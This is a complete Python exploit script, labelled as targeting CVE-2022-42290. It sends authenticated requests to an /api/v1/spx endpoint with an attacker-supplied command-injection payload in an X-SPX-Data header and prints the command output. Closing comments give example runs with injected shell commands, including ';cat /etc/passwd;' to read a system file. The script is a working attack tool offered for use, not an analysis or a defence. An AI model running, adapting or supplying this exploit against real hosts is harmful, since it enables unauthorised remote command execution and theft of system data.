import argparse
import requests
import base64

def exploit(target_host, auth_credentials, payload, num_requests):
    auth_header = "Basic " + base64.b64encode(auth_credentials.encode()).decode()

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
        "Authorization": auth_header,
        "X-SPX-Data": payload
    }

    url = f"http://{target_host}/api/v1/spx"

    for i in range(num_requests):
        try:
            response = requests.get(url, headers=headers)
            response.raise_for_status()
            print(f"Command output ({i+1}): {response.text}")
        except requests.exceptions.HTTPError as errh:
            print(f"HTTP Error ({i+1}): {errh}")
        except requests.exceptions.ConnectionError as errc:
            print(f"Error Connecting ({i+1}): {errc}")
        except requests.exceptions.Timeout as errt:
            print(f"Timeout Error ({i+1}): {errt}")
        except requests.exceptions.RequestException as err:
            print(f"Unknown Error ({i+1}): {err}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exploit for CVE-2022-42290")
    parser.add_argument("target_host", help="IP address or hostname of the target system")
    parser.add_argument("auth_credentials", help="Authorization credentials in the format 'username:password'")
    parser.add_argument("payload", help="Payload to execute on the target system")
    parser.add_argument("--num-requests", type=int, default=1, help="Number of requests to send (default: 1)")
    args = parser.parse_args()

    exploit(args.target_host, args.auth_credentials, args.payload, args.num_requests)

# example.com admin:password "%3Bls%20-la%3B" --num-requests 5
# 192.168.1.100 admin:password123 ";cat /etc/passwd;" --num-requests 5
